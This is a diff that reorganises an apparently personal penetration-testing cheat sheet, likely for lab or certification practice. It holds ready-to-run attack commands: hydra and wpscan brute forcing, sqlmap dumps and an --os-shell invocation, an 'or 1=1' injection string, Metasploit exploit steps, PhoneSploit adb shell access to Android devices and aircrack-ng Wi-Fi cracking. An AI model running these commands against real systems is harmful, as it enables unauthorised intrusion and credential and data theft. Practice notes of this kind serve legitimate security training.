@@ -2,6 +2,8 @@
 nmap -sn <IP Block>
 netdiscovery -r <IP Block>
 
+########################################################## NMAP scans #####################################################################
+
 ###find version of the OS and AD #### you must enable rdp after thet you can get OS VERSION 
 sudo nmap -p 3389 --script rdp-ntlm-info target_ip ###### useful for ad Os version 
 
@@ -30,7 +32,11 @@ nmap — script smb-os-discovery.nse -p445 <ip> (enumerate os, domain name,etc)
 nmap — script smb-enum-users.nse -p445 <ip> (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)
 nmap -p 445 — script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)
 
-######
+### Finding Domain Controller and FQDN ####
+nmap -p389,636,3268,3269 --script ldap-rootdse <IP> // LDAP Service enumaration
+FQDN = Hostname+Domain // hostname.domain
+
+
 —------------------------
 Nmap -Pn -p 21 target > ftp
 grep -B 5 open ftp
@@ -41,11 +47,6 @@ grep -B 5 open rdp
 —-------------------------
 Nmap -Pn -p 3306 target > mysql
 grep -B 5 open mysql
-
-
-######
-
-
 
 optional
 -p : ports //-p- all ports(1-65535) | -p80,445 only 80 and 445 ports 
@@ -61,18 +62,20 @@ Common Services
 FTP:21    SSH:22    Telnet:23    SMTP:25    HTTP:80    HTTPS:443    SMB:139/445        
 RDP:3389    MYSQL:3306    MSSQL:1433    LDAP:389/636/3268/3269    NFS:2049
 
+############################################################ RAT #####################################################################
 RAT's Default Ports
 ProRAT:5110    Theef:6703/2968/9871    NjRAT:5552/1177
 
-### Finding Domain Controller and FQDN ####
-nmap -p389,636,3268,3269 --script ldap-rootdse <IP> // LDAP Service enumaration
-FQDN = Hostname+Domain // hostname.domain
 
-###### smb user get 
+
+#################################################### SMB USER GET #####################################################################
 smbclient -L \\ip
 smbclient \\\\ip\\share_name -U user%password
 
-#### Brute Force #####
+################################################# Brute Forcing SMS  ##################################################################
+
+https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
+
 usage : hydra -l <username> -P <Wordlist Path> <Protocol>://<IP>
 example : hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.12
 hydra -t 4 -V -l user -P /path/to/password-list.txt rdp://<target_ip>
@@ -86,17 +89,13 @@ optional
 -p : spesific password (qwerty,password1)
 -P : password wordlist (/usr/share/wordlists/rockyou.txt)
 
-### Brute Forcing SMS  ###
-
-https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
-
 
 Wpscan
 Wpscan –url http://ip/ --enumerate u
 wpscan --url http://ip:port/uri -u root -P passwdfile.txt
 wpscan -u james -P /password.txt — urlhttp://:8080/TEST
 
-Metasploit
+############################################################### Metasploit ##################################################################
 msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 show options
 set PASS_FILE /home/anar/password.txt
@@ -105,22 +104,19 @@ set RPORT 8080          (target port)
 set TARGETURI /uri
 set USERNAME admin
 
-### SQL Injection
-
-Sqlmap -r req.txt   --dbs
-Sqlmap -r req.txt -D dvwa
-Sqlmap -r req.txt -D dvwa --table
-Sqlmap -r req.txt -D dvwa --tables –columns 
-Sqlmap -r req.txt -D dvwa --dump 
-
-##### Metasploit
 msfconsole
 search name
 use exploit/unix/webapp/
 set RHOSTS ip
 set RPORT port
 run
-#######
+################################################################## Sql injection ##################################################################
+
+Sqlmap -r req.txt   --dbs
+Sqlmap -r req.txt -D dvwa
+Sqlmap -r req.txt -D dvwa --table
+Sqlmap -r req.txt -D dvwa --tables –columns 
+Sqlmap -r req.txt -D dvwa --dump
 
 In alternative we can use SQLMap and the vulnerable url
 
@@ -148,15 +144,11 @@ admin’ or 1=1 - -
 
  `sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" --os-shell`
 
-### Wireshark Usefull Filters  ###
-
-#####
+############################################################## Wireshark Usefull Filters################################################################
 ip.addr == 192.168.1.1: Show packets to or from the specified IP address.
 ip.src == 192.168.1.1: Show packets from the specified source IP address.
 ip.dst == 192.168.1.1: Show packets to the specified destination IP address.
-
 http.request.method==POST
-
 To find DOS (SYN and ACK) :
 open file with wireshark
 statistic -> IPv4 statistics -> source and destination address
@@ -165,20 +157,18 @@ or
 `tcp.flags.syn == 1 and tcp.flags.ack == 0` 
 or 
 filter to highest number of request
-
 find IoT 
 in search write mqtt
 in MQ Telemetry Transport Protocol , Publish Message
 find
 Message: ddfgdfgdsfg;ldsf;lgk
-
 http.response.code == 404: Show HTTP packets with a 404 status code (Not Found).
 http.response.code >= 400: Show HTTP error responses (client and server errors).
 tcp.stream eq 1: Show packets for a specific TCP stream (replace "1" with the appropriate stream index).
 tcp.flags.syn == 1 and tcp.flags.ack == 0: Show SYN packets (indicating new TCP connections).
-#########################################
+############################################################################################################################################ 
 
-##### Cryptografy #####
+################################################################ Cryptografy ###############################################################
 snow -C -p "password" <target_file>
 openstego
 
@@ -202,16 +192,31 @@ Wireshark
 Winscp
 OWASP ZAP
 RDP
-
-
-##### Mobile Hacking #### 
+############################################## Mobile Hacking ---- android-using-phonesploit ########################################################################################################################## 
 adb connect <IP>:<PORT>(default port 5555)
 adb shell
 pwd, ls ... basic linux commands
 exit
 adb pull <target_file> .
+#
+cd PhoneSploit
+python3 -m pip install colorama
+python3 phonesploit.py
+Type 3 and press Enter to select [3] Connect a new phone option.
 
-#### WIFI Hacking ####
+When prompted to Enter a phones ip address, type the target Android device’s IP address (in this case, 10.10.10.14) and press Enter.
+
+If you are getting Connection timed out error, then type 3 again and press Enter. If you do not get any option, then type 3 and press Enter again, until you get Enter a phones ip address option.
+You will see that the target Android device (in this case, 10.10.10.14) is connected through port number 5555.
+
+If you are unable to establish a connection with the target device, then press Ctrl+C and re-perform steps#8–11.
+Now, at the main_menu prompt, type 4 and press Enter to choose Access Shell on a phone.
+
+When prompted to Enter a device name, type the target Android device’s IP address (in this case, 10.10.10.14) and press Enter.
+
+#################################################################################################################################################################################
+
+####################################################### WIFI Hacking ########################################################################################################
 Crack the wireless encryption and identify the Wi-Fi password
 1st tentative:** `aircrack-ng pcapfile` (usually works only for WEP encryption)
 2nd tentative**: `aircrack-ng -w passwordlist pcapfile`
@@ -224,7 +229,7 @@ aircrack-ng -a2 -b SSID  -w /usr/share/wordlists/password.txt '/home/anar/data/a
 SMS hacking 
 https://walk-throughs.medium.com/exploiting-drupal-via-metasploit-ctf-walkthrough-fcd5f5fa2fa
 
-
+################################################################################################################################################################################
 ######
 https://www.cvedetails.com/
 https://crackstation.net/
